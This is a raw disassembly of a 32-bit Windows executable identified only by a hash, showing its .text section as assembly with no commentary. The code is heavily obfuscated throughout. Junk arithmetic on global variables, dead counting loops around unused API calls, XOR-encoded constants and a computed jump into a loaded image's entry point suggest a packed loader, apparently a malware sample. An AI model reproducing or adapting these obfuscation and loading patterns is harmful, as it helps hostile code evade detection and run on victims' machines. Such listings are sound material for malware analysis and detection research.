
7a2850e5ffd80ae7b04fe4d5d46f9a2c5e31d6205863bb662af3fa252ee0f57c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
